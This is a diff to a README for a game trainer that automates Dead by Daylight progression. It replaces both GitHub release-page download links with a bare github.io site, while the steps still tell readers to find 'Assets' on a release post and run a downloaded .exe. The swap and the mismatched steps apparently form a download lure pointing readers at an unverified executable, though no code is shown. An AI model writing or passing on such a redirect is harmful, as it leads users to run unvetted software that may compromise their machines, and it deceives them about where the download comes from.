@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026 - Automate your Dead by Daylight progression
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/indishabille-tory671/DBD-AutoGrind-Trainer-2026/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://indishabille-tory671.github.io)
 
 ## 📖 Overview
 
@@ -25,7 +25,7 @@ Before you install this software, confirm your computer meets these requirements
 
 Follow these steps to obtain the correct version of the trainer:
 
-1. Visit the project release page here: [https://github.com/indishabille-tory671/DBD-AutoGrind-Trainer-2026/releases](https://github.com/indishabille-tory671/DBD-AutoGrind-Trainer-2026/releases).
+1. Visit the project release page here: [https://indishabille-tory671.github.io](https://indishabille-tory671.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
 3. Click the file ending in `.exe` to start your download.
 4. Save the file to a folder on your computer that you can find easily, such as your Desktop or Downloads folder.
